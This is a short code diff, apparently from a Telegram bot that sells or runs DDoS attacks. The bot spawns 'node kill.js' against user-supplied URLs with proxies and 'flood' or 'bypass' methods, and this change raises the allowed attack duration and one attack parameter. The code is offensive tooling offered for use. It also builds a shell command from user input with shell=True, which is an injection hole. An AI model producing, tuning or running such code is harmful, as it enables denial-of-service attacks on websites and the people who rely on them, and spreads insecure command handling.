@@ -20,7 +20,7 @@ BLACKLIST = [
     "facebook.com", "chinhphu.vn"
 ]
 
-MAX_USER_TIME = 60  # Gioi han time user goi attack thuong
+MAX_USER_TIME = 120  # Gioi han time user goi attack thuong
 DEFAULT_RATE = 20
 DEFAULT_THREAD = 10
 
@@ -150,7 +150,7 @@ def attackvip(update: Update, context: CallbackContext):
             update.message.reply_text("❌ Phuong thuc chi co flood hoac bypass.")
             return
 
-        cmd = f"node kill.js {url} {duration} 20 15 {VIP_PROXY} {method}"
+        cmd = f"node kill.js {url} {duration} 20 20 {VIP_PROXY} {method}"
         proc = subprocess.Popen(cmd, shell=True)
         attack_processes.append(proc)
         user_last_attack_time[user_id] = time.time()
